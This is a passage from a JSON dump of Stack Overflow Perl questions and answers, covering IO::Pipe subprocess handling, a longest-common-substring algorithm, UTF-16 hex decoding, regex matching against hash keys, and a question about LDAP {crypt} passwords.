"reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2632, "favorite_count": 0, "accepted_answer_id": 33639723, "answer_count": 3, "score": -1, "last_activity_date": 1447361644, "creation_date": 1447189539, "last_edit_date": 1447361644, "question_id": 33639613, "link": "https://stackoverflow.com/questions/33639613/how-to-decode-a-ldap-crypt-password", "title": "How to decode a LDAP {crypt} password", "body": "<p>I'm studying a migration from an old LDAP to a new database.\nToday I just found that the passwords are all saved as {crypt} passwords and the new system does not support that.</p>\n\n<p>Is it possible to decode the {crypt} passwords (in PERL if possible) ?</p>\n"}, {"tags": ["perl", "ipc"], "answers": [{"comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 1, "creation_date": 1447190666, "post_id": 33639732, "comment_id": 55053765, "body": "By default, Backticks overrides the behavior of <code>``</code> using <a href=\"https://metacpan.org/pod/Backticks#Source-filtering\" rel=\"nofollow noreferrer\">source filtering</a>. I would disable this, since <a href=\"http://stackoverflow.com/questions/1785852/why-are-perl-source-filters-bad-and-when-is-it-ok-to-use-them\">source filters are generally bad</a>. The docs recommend <code>use Backticks; no Backticks;</code>, although I&#39;m still trying to wrap my head around how that works."}, {"owner": {"reputation": 7801, "user_id": 1212401, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/ed478436fcb05fd3ae15da650d2a8cd6?s=128&d=identicon&r=PG", "display_name": "Chris Doyle", "link": "https://stackoverflow.com/users/1212401/chris-doyle"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1447190764, "post_id": 33639732, "comment_id": 55053824, "body": "@ThisSuitIsBlackNot - Yeah i noticed that in the POD and various ways to restore the perl backtick functionality but left it for the user to read the POD himself. I assumed if he wanted to use a more OO approach to calling external commands that he would do it for all"}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1447190982, "post_id": 33639732, "comment_id": 55053938, "body": "My point is that your example code changes the behavior of a core operator, with no indication that it does so. I think that warrants mentioning in the text of your answer (or the code itself) instead of buried in a link."}], "tags": [], "owner": {"reputation": 7801, "user_id": 1212401, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/ed478436fcb05fd3ae15da650d2a8cd6?s=128&d=identicon&r=PG", "display_name": "Chris Doyle", "link": "https://stackoverflow.com/users/1212401/chris-doyle"}, "is_accepted": false, "score": 0, "last_activity_date": 1447191579, "last_edit_date": 1447191579, "creation_date": 1447189961, "answer_id": 33639732, "question_id": 33638305, "link": "https://stackoverflow.com/questions/33638305/how-to-read-stdout-from-a-sub-process-in-oo-perl/33639732#33639732", "title": "How to read STDOUT from a sub-process in OO Perl", "body": "<p><a href=\"http://search.cpan.org/~kilna/Backticks-v1.0.9/lib/Backticks.pm\" rel=\"nofollow\">Backticks</a> is not a core module but seems to do what your looking for.</p>\n\n<pre><code>use strict;\nuse warnings;\nuse Backticks;\nmy $cmd = Backticks-&gt;new(join (\" \", @ARGV));\n$cmd-&gt;run();\n\nif ($cmd-&gt;success){\n        print $cmd-&gt;stdout\n} else {\n        print \"Command failed\\n\";\n}\n</code></pre>\n\n<p>Running this with a valid command then invalid command gives the below results</p>\n\n<p><strong>io_pipe.pl \"uname -o\"</strong></p>\n\n<pre><code>GNU/Linux\n</code></pre>\n\n<p><strong>io_pipe.pl \"uname -z\"</strong></p>\n\n<pre><code>Command failed\n</code></pre>\n\n<p><strong>Update</strong>\nAs pointed out by @thisSuitIsNotBlack, this module changes the deafult behaviour of backticks in perl. You should read the Notes section of the POD. However the main one to be aware of is:</p>\n\n<blockquote>\n  <p>The overriding of <code>backticks</code> is provided by Filter::Simple. Source\n  filtering can be weird sometimes... if you want to use this module in\n  a purely traditional Perl OO style, simply turn off the source\n  filtering as soon as you load the module:</p>\n</blockquote>\n\n<pre><code> use Backticks;\n no Backticks;\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 126333, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "is_accepted": false, "score": 3, "last_activity_date": 1447193119, "creation_date": 1447193119, "answer_id": 33640537, "question_id": 33638305, "link": "https://stackoverflow.com/questions/33638305/how-to-read-stdout-from-a-sub-process-in-oo-perl/33640537#33640537", "title": "How to read STDOUT from a sub-process in OO Perl", "body": "<p>The issue is not IO::Pipe.  The problem is <code>eof</code> is the wrong way to check for a pipe error.  It doesn't mean there's no pipe, it means there's nothing to read <em>from that pipe</em>.  You'd have the same problem with <code>eof PIPE</code>.  It's perfectly fine for a sub-process to not print anything.</p>\n\n<p>If you want to check the sub-process successfully ran, it turns out IO::Pipe already does that for you.</p>\n\n<pre><code># IO::Pipe: Cannot exec: No such file or directory\n$pipe-&gt;reader(\"hajlalglagl\");\n</code></pre>\n"}], "owner": {"reputation": 13138, "user_id": 45978, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/d0c6b3923ad69ce9a13dbe8775b7b3dc?s=128&d=identicon&r=PG", "display_name": "Joe Casadonte", "link": "https://stackoverflow.com/users/45978/joe-casadonte"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 587, "favorite_count": 1, "answer_count": 2, "score": 4, "last_activity_date": 1447193119, "creation_date": 1447184890, "question_id": 33638305, "link": "https://stackoverflow.com/questions/33638305/how-to-read-stdout-from-a-sub-process-in-oo-perl", "title": "How to read STDOUT from a sub-process in OO Perl", "body": "<p>In Perl, one way to read the STDOUT of a subprocess is to use <code>open</code>:</p>\n\n<pre><code>open(PIPE, \"ls -l |\");\n</code></pre>\n\n<p>I was looking for a more object-oriented way to do this, though, and I've been using <code>IO::Pipe</code> with some success. I want to detect errors, though, specifically if the command is not executable. I can't figure out how to do that via <code>IO::Pipe</code>, though. Here's what I have:</p>\n\n<pre><code>use strict;\nuse warnings;\n\nuse IO::Pipe;\n\n\nmy($cmd) = join (\" \", @ARGV);\n\nopen(PIPE, \"$cmd |\") || die qq(error opening PIPE);\nwhile (&lt;PIPE&gt;) {\n        chomp;\n        print \"DBG1: $_\\n\";\n}\n\nclose PIPE;\n\nmy($pipe) = IO::Pipe-&gt;new();\n$pipe-&gt;reader($cmd);\ndie qq(error opening IO::Pipe) if $pipe-&gt;eof();\n\nwhile (&lt;$pipe&gt;) {\n        chomp;\n        print \"DBG2: $_\\n\";\n}\n\n$pipe-&gt;close();\n</code></pre>\n\n<p>If the sub-process command is invalid, both checks will correctly <code>die</code>. If the sub-process produces no output, though, <code>eof()</code> will report an error, even if the command itself is fine:</p>\n\n<pre><code>$ perl pipe.pl \"ls -l &gt;/dev/null\"\nerror opening IO::Pipe at pipe.pl line 20.\n</code></pre>\n\n<p>A bunch of questions, then:</p>\n\n<p>Is there a reasonable OO way to read from a sub-process in Perl? Is <code>IO::Pipe</code> the correct tool to use? If so, how do I check to make sure the sub-process command is created successfully? If not, what should I be using? I don't want to write to the sub-process, so I don't think I want <code>IPC::Open2</code> or <code>IPC::Open3</code>. I would prefer to use a core module, if possible.</p>\n"}, {"tags": ["regex", "perl"], "answers": [{"comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1447183972, "post_id": 33638034, "comment_id": 55050045, "body": "<code>$1</code> could contain anything (including &quot;orange&quot;) in that code. I fixed it, but Borodin reverted the fix without explanation."}, {"owner": {"reputation": 1088, "user_id": 1013823, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/pkbV7.jpg?s=128&g=1", "display_name": "Kris Oye", "link": "https://stackoverflow.com/users/1013823/kris-oye"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1447184049, "post_id": 33638034, "comment_id": 55050089, "body": "True... I would normally check to make sure the match was successful before interrogating the value of $1."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1447184067, "post_id": 33638034, "comment_id": 55050101, "body": "Even with the fix, it doesn&#39;t do what the OP asks. It simply checks if <code>$string2</code> contains <code>apple</code>."}], "tags": [], "owner": {"reputation": 1088, "user_id": 1013823, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/pkbV7.jpg?s=128&g=1", "display_name": "Kris Oye", "link": "https://stackoverflow.com/users/1013823/kris-oye"}, "is_accepted": false, "score": 0, "last_activity_date": 1447183924, "last_edit_date": 1447183924, "creation_date": 1447183811, "answer_id": 33638034, "question_id": 33637930, "link": "https://stackoverflow.com/questions/33637930/perl-string-matching-to-find-longest-substring/33638034#33638034", "title": "perl: string matching to find longest substring", "body": "<p>The =~ operator is not going to reassign the value of $string2.  Try this:</p>\n\n<pre><code>$string2 =~ m/(.+apple.+)/;\nmy $match = $1;\nprint $match\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 6457, "user_id": 3391549, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/d57b4a09e70b34f4c51dd8fc0f44ca24?s=128&d=identicon&r=PG&f=1", "display_name": "Adrian", "link": "https://stackoverflow.com/users/3391549/adrian"}, "edited": false, "score": 0, "creation_date": 1447208006, "post_id": 33640226, "comment_id": 55060332, "body": "Thanks for the detailed answer. I was wondering...would it work if i put the 2 strings into arrays <code>@str1 =  split(&#47;&#47;, $string1);</code> and <code>@str2 = split(&#47;&#47;, $string2);</code>. And then finding the intersection of the two arrays? Would that simplify the code?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 6457, "user_id": 3391549, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/d57b4a09e70b34f4c51dd8fc0f44ca24?s=128&d=identicon&r=PG&f=1", "display_name": "Adrian", "link": "https://stackoverflow.com/users/3391549/adrian"}, "edited": false, "score": 0, "creation_date": 1447208250, "post_id": 33640226, "comment_id": 55060390, "body": "I don&#39;t see how getting the letters that are common to both strings will help."}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 0, "last_activity_date": 1447194606, "last_edit_date": 1447194606, "creation_date": 1447191993, "answer_id": 33640226, "question_id": 33637930, "link": "https://stackoverflow.com/questions/33637930/perl-string-matching-to-find-longest-substring/33640226#33640226", "title": "perl: string matching to find longest substring", "body": "<p>Based on the <a href=\"https://en.wikipedia.org/wiki/Longest_common_substring_problem\" rel=\"nofollow\">general algorithm</a>, but tracks not only the length of the current run (<code>@l</code>), but whether it includes the keyword (<code>@k</code>). Only runs that include the keyword are considered for longest run.</p>\n\n<pre><code>use strict;\nuse warnings;\nuse feature qw( say );\n\nsub find_substrs {\n   our $s;   local *s   = \\shift;\n   our $key; local *key = \\shift;\n\n   my @positions;\n   my $position = -1;\n   while (1) {\n      $position = index($s, $key, $position+1);\n      last if $position &lt; 0;\n\n      push @positions, $position;\n   }\n\n   return @positions;\n}\n\nsub lcsubstr_which_include {\n   our $s1;  local *s1  = \\shift;\n   our $s2;  local *s2  = \\shift;\n   our $key; local *key = \\shift;\n\n   my @key_starts1 = find_substrs($s1, $key)\n      or return;\n\n   my @key_starts2 = find_substrs($s2, $key)\n      or return;\n\n   my @is_key_start1;  $is_key_start1[$_] = 1 for @key_starts1;\n   my @is_key_start2;  $is_key_start2[$_] = 1 for @key_starts2;\n\n   my @s1 = split(//, $s1);\n   my @s2 = split(//, $s2);\n\n   my $length = 0;\n   my @rv;\n   my @l = ( 0 ) x ( @s1 + 1 );  # Last ele is read when $i1==0.\n   my @k = ( 0 ) x ( @s1 + 1 );  # Same.\n   for my $i2 (0..$#s2) {\n      for my $i1 (reverse 0..$#s1) {\n         if ($s1[$i1] eq $s2[$i2]) {\n            $l[$i1] = $l[$i1-1] + 1;\n            $k[$i1] = $k[$i1-1] || ( $is_key_start1[$i1] &amp;&amp; $is_key_start2[$i2] );\n\n            if ($k[$i1]) {\n               if ($l[$i1] &gt; $length) {\n                  $length = $l[$i1];\n                  @rv = [ $i1, $i2, $length ];\n               }\n               elsif ($l[$i1] == $length) {\n                  push @rv, [ $i1, $i2, $length ];\n               }\n            }\n         } else {\n            $l[$i1] = 0;\n            $k[$i1] = 0;\n         }\n      }\n   }\n\n   for (@rv) {\n      $_-&gt;[0] -= $length;\n      $_-&gt;[1] -= $length;\n   }\n\n   return @rv;\n}\n\n{\n   my $s1 = \"peachbananaapplepear\";\n   my $s2 = \"juicenaapplewatermelonpear\";\n   my $key = \"apple\";\n\n   for (lcsubstr_which_include($s1, $s2, $key)) {\n      my ($s1_pos, $s2_pos, $length) = @$_;\n      say substr($s1, $s1_pos, $length);\n   }\n}\n</code></pre>\n\n<p>This solution in O(NM), meaning it scales amazingly well (for what it does).</p>\n"}, {"tags": [], "owner": {"reputation": 1858, "user_id": 4799193, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a87fb12a6ad909323fb42a48e78b3f28?s=128&d=identicon&r=PG&f=1", "display_name": "ramana_k", "link": "https://stackoverflow.com/users/4799193/ramana-k"}, "is_accepted": true, "score": 1, "last_activity_date": 1447213149, "last_edit_date": 1447213149, "creation_date": 1447210088, "answer_id": 33643457, "question_id": 33637930, "link": "https://stackoverflow.com/questions/33637930/perl-string-matching-to-find-longest-substring/33643457#33643457", "title": "perl: string matching to find longest substring", "body": "<p>Here is one approach. First get the locations where 'apple' appears in the strings. And for each of those locations in string1, look at all locations in string2.\nLook to the left and right to see how far the commonality extends from the initial location.</p>\n\n<pre><code>$string1 = \"peachbananaapplepear12345applegrapeapplebcdefghijk\";\n$string2 = \"juicenaapplewatermelonpearkiwi12345applebcdefghijkberryapple\";\n\nmy $SearchFor=\"apple\";\nmy $SearchStrLen = length($SearchFor);\n\n# Get locations in first string where the search term appears\nmy @FirstPositions =  getPostions($string1);\n# Get locations in second string where the search term appears\nmy @SecondPositions =  getPostions($string2);\n\nCheckForMaxMatch();\n\nsub getPostions\n{\n  my $GivenString = shift;\n  my @Positions;\n  my $j=0;\n  for (my $i=0; $i &lt; length($GivenString); $i += ($SearchStrLen+1) )\n  {\n    $j = index($GivenString, $SearchFor, $i);\n    if ($j == -1) {\n     last;\n    }\n    push (@Positions, $j);\n    $i = $j;\n  }\n\n  return @Positions;\n}\n\nsub CheckForMaxMatch\n{\n  my $MaxLeft=0;\n  # From the location of 'apple', look to the left and right\n  # to see how far the characters are same\n  for my $i (@FirstPositions) {\n    for my $j (@SecondPositions) {\n      my $LeftMatchPos = getMaxMatch($i, $j, -1);\n      my $RightMatchPos = getMaxMatch($i, $j, 1);\n\n      if ( ($RightMatchPos - $LeftMatchPos) &gt; ($MaxRight - $MaxLeft) ) {\n        $MaxLeft = $LeftMatchPos;\n        $MaxRight = $RightMatchPos;\n      }\n    }\n  }\n\n  my $LongestSubString = substr($string1, $MaxLeft, $MaxRight-$MaxLeft);\n  print \"Longest common substring is: $LongestSubString\\n\";\n  print \"It begins at $MaxLeft and ends at $MaxRight in string1\\n\";\n}\n\nsub getMaxMatch\n{\n  my $i= shift;\n  my $j= shift;\n  my $direction= shift;\n\n  my $k = ($direction &gt;= 1 ? $SearchStrLen : 0);\n\n  my $FirstChar = substr($string1, $i+($k * $direction), 1);\n  my $SecondChar = substr($string2, $j+($k * $direction), 1);\n\n  for ( ; $FirstChar &amp;&amp; $SecondChar; $k++ )\n  {\n    $FirstChar = substr($string1, $i+($k * $direction), 1);\n    $SecondChar = substr($string2, $j+($k * $direction), 1);\n    if ( $FirstChar ne $SecondChar ) {\n      $direction &lt; 1 ? $k-- : \"\";\n      my $pos = ($k ? ($i + $k * $direction) : $i);\n      return $pos;\n    }\n  }\n\n  return $i;\n}\n</code></pre>\n"}], "owner": {"reputation": 6457, "user_id": 3391549, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/d57b4a09e70b34f4c51dd8fc0f44ca24?s=128&d=identicon&r=PG&f=1", "display_name": "Adrian", "link": "https://stackoverflow.com/users/3391549/adrian"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 359, "favorite_count": 0, "accepted_answer_id": 33643457, "answer_count": 3, "score": 0, "last_activity_date": 1447214366, "creation_date": 1447183452, "question_id": 33637930, "link": "https://stackoverflow.com/questions/33637930/perl-string-matching-to-find-longest-substring", "title": "perl: string matching to find longest substring", "body": "<pre><code>$string1 = \"peachbananaapplepear\";\n$string2 = \"juicenaapplewatermelonpear\";\n</code></pre>\n\n<p>I want to know what's the longest common substring containing the word \"apple\".</p>\n\n<pre><code>$string2 =~ m/.+apple.+/;\nprint $string2;\n</code></pre>\n\n<p>So I use the match operator, and <code>.+</code> for matching any character before and after the keyword \"apple\". When I print <code>$string2</code> it doesn't return <code>naapple</code> but returns the original <code>$string2</code> instead.</p>\n"}, {"tags": ["perl", "encoding", "character-encoding"], "answers": [{"comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 236, "user_id": 261158, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2ee95f21c396e0523cbee574f7a90973?s=128&d=identicon&r=PG", "display_name": "DrNoone", "link": "https://stackoverflow.com/users/261158/drnoone"}, "edited": false, "score": 0, "creation_date": 1447183804, "post_id": 33637893, "comment_id": 55049965, "body": "@DrNoone: Please read <a href=\"http://stackoverflow.com/help/someone-answers\"><b><i>What should I do when someone answers my question?</i></b></a>"}, {"owner": {"reputation": 236, "user_id": 261158, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2ee95f21c396e0523cbee574f7a90973?s=128&d=identicon&r=PG", "display_name": "DrNoone", "link": "https://stackoverflow.com/users/261158/drnoone"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1447187872, "post_id": 33637893, "comment_id": 55052260, "body": "@Borodin I know what to do. But the system didn&#39;t allowed me to mark as solved because it was too soon."}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 2, "last_activity_date": 1447183315, "creation_date": 1447183315, "answer_id": 33637893, "question_id": 33637846, "link": "https://stackoverflow.com/questions/33637846/convert-two-byte-hex-string-to-char-in-perl/33637893#33637893", "title": "Convert two-byte hex string to char in perl", "body": "<pre><code>use Encode qw( decode );\n\nmy $char_string = decode('UTF-16be', pack('H*', $hex_string));\n</code></pre>\n"}], "owner": {"reputation": 236, "user_id": 261158, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2ee95f21c396e0523cbee574f7a90973?s=128&d=identicon&r=PG", "display_name": "DrNoone", "link": "https://stackoverflow.com/users/261158/drnoone"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 419, "favorite_count": 0, "accepted_answer_id": 33637893, "answer_count": 1, "score": 2, "last_activity_date": 1447183315, "creation_date": 1447183147, "question_id": 33637846, "link": "https://stackoverflow.com/questions/33637846/convert-two-byte-hex-string-to-char-in-perl", "title": "Convert two-byte hex string to char in perl", "body": "<p>I have a string of two-byte hex characters and I'd like to convert them to an ascii or unicode string. The string can have a variable length. Input:</p>\n\n<pre><code>$hex_string=\"003400300030\"\n</code></pre>\n\n<p>Desired output:</p>\n\n<pre><code>$char_string=\"400\"\n</code></pre>\n"}, {"tags": ["regex", "string", "perl", "hash"], "comments": [{"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1447178334, "post_id": 33636400, "comment_id": 55046885, "body": "Can you give some examples of what should and shouldn&#39;t match? It&#39;ll be hard to answer this question without that. But the typical trick would be - remove the pattern anchors on the regex, and then a substring match will work - as noted in <a href=\"http://stackoverflow.com/questions/33373587/string-comparison-for-hash-keys-in-perl/33374145?noredirect=1#comment55046671_33374145l\">your other question</a> - in the first example I gave, there&#39;s no anchors so it substring matches."}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1447178555, "post_id": 33636400, "comment_id": 55047038, "body": "Nit: you said &quot;assuming all keys are unique&quot;. There&#39;s no assumption here. They <b>have</b> to be unique---that&#39;s the definition of a hash!"}, {"owner": {"reputation": 905, "user_id": 1188611, "user_type": "registered", "accept_rate": 26, "profile_image": "https://www.gravatar.com/avatar/67b60365e971b8b9cf5f0b901868bfd7?s=128&d=identicon&r=PG", "display_name": "user1188611", "link": "https://stackoverflow.com/users/1188611/user1188611"}, "reply_to_user": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1447178598, "post_id": 33636400, "comment_id": 55047070, "body": "@MattJacob: by unique i mean to say pattern thye will match against will be unique"}, {"owner": {"reputation": 905, "user_id": 1188611, "user_type": "registered", "accept_rate": 26, "profile_image": "https://www.gravatar.com/avatar/67b60365e971b8b9cf5f0b901868bfd7?s=128&d=identicon&r=PG", "display_name": "user1188611", "link": "https://stackoverflow.com/users/1188611/user1188611"}, "edited": false, "score": 0, "creation_date": 1447178611, "post_id": 33636400, "comment_id": 55047077, "body": "added an example of what should match and what not in questions"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1447179617, "post_id": 33636400, "comment_id": 55047667, "body": "What result do you want for the string <code>&#39;Hello World, I am XYZ!!!!!  Programming is good!</code>?"}, {"owner": {"user_type": "does_not_exist", "display_name": "user557597"}, "edited": false, "score": 0, "creation_date": 1447182619, "post_id": 33636400, "comment_id": 55049309, "body": "This <code>\\W</code> will always hound you. It strips all non-words. You can actually see already, you&#39;ve molded your test <code>&#39;Hello World, I am XYZ!!!!!</code> to have an outcome that will match cropped key. In the real world this will always fail given a partial key match. Also, you don&#39;t need <code>\\Q .. \\E</code> since there are no metachars in <i>word</i> characters since you&#39;ve already stripped them. The best you could do is match a substring (ie. lose the anchors). But, why even do that, just use <code>substr()</code> its a lot faster. Nice idea though."}, {"owner": {"user_type": "does_not_exist", "display_name": "user557597"}, "edited": false, "score": 0, "creation_date": 1447183191, "post_id": 33636400, "comment_id": 55049635, "body": "The cleanest approach might be to construct a regex using all the keys within a big alternation. Then do a single pass regex on the $input. How many keys do you have? The regex engine will construct a trie that makes the search very fast.\\"}], "answers": [{"comments": [{"owner": {"reputation": 905, "user_id": 1188611, "user_type": "registered", "accept_rate": 26, "profile_image": "https://www.gravatar.com/avatar/67b60365e971b8b9cf5f0b901868bfd7?s=128&d=identicon&r=PG", "display_name": "user1188611", "link": "https://stackoverflow.com/users/1188611/user1188611"}, "edited": false, "score": 0, "creation_date": 1447191026, "post_id": 33636650, "comment_id": 55053961, "body": "This will fail for condition when there is a lower case and upper case difference. For example:  Hello World, I am xyz and ABC!!!!! ,  for this case it will fail but was working before."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "reply_to_user": {"reputation": 905, "user_id": 1188611, "user_type": "registered", "accept_rate": 26, "profile_image": "https://www.gravatar.com/avatar/67b60365e971b8b9cf5f0b901868bfd7?s=128&d=identicon&r=PG", "display_name": "user1188611", "link": "https://stackoverflow.com/users/1188611/user1188611"}, "edited": false, "score": 0, "creation_date": 1447191350, "post_id": 33636650, "comment_id": 55054108, "body": "If only there was some flag that you could put in your pattern match to make it case insensitive. Something like <code>i</code> maybe."}], "tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": false, "score": 0, "last_activity_date": 1447191519, "last_edit_date": 1447191519, "creation_date": 1447178824, "answer_id": 33636650, "question_id": 33636400, "link": "https://stackoverflow.com/questions/33636400/comparison-of-string-against-key-value-pair-in-hash-map-perl/33636650#33636650", "title": "comparison of string against key-value pair in hash map perl", "body": "<p>This may be as simple as:</p>\n\n<pre><code>my ( $first_match ) = grep { s/\\W//gr =~ m/\\Q$transformed_match\\E/i } keys %msg_to_number;\n</code></pre>\n\n<p>Remove the pattern anchors, and provided <code>$transformed_match</code> is a substring of the (transformed) key, then it'll match. </p>\n\n<p>Or you can reverse that - so if the <em>key</em> is the substring, it matches:</p>\n\n<pre><code>#!/usr/bin/env perl\nuse strict;\nuse warnings;\n\nmy %msg_to_number = ( \n 'Hello World, I am XYZ'    =&gt; 11,\n 'I am using Stack Overflow for Guidance'   =&gt; 12,\n 'Programming is good!' =&gt; 13,\n);\n\nmy $str_to_match = 'Hello World, I am XYZ and ABC!!!!!';\nmy $transformed_match = $str_to_match =~ s/\\W//gr;\n\nmy ( $first_match ) = grep { my $tr_key = s/\\W//gr; $transformed_match =~ m/$tr_key/i or $tr_key =~ m/$transformed_match/ } keys %msg_to_number;\nprint \"$first_match   =  $msg_to_number{$first_match}\\n\";\n</code></pre>\n\n<p>(There may be a way to do the transform-and-match within the regex - I'm not 100% sure. But it's probably not a great idea anyway!)</p>\n"}, {"comments": [{"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1447191494, "post_id": 33637448, "comment_id": 55054210, "body": "What does this accomplish? You&#39;re matching a defined string against the input and the keys of the hash. Where does that string come from?"}], "tags": [], "owner": {"reputation": 717, "user_id": 1483288, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/5b0b7a55223dba7a538aaf97dbbc6150?s=128&d=identicon&r=PG", "display_name": "ccc31807", "link": "https://stackoverflow.com/users/1483288/ccc31807"}, "is_accepted": false, "score": 0, "last_activity_date": 1447181820, "creation_date": 1447181820, "answer_id": 33637448, "question_id": 33636400, "link": "https://stackoverflow.com/questions/33636400/comparison-of-string-against-key-value-pair-in-hash-map-perl/33637448#33637448", "title": "comparison of string against key-value pair in hash map perl", "body": "<p>I'm not sure what you want to do, but it seems that you need a three way match. If you use REGXs, you need to make sure that you either match all cases you want, or mismatch all cases you do not want. The following script may be closer to what you need. It matches (1) your input string, (2) your HASH KEY, and (3) what you appear to be looking for.</p>\n\n<pre><code>   use strict;\n   use warnings;\n\n   my 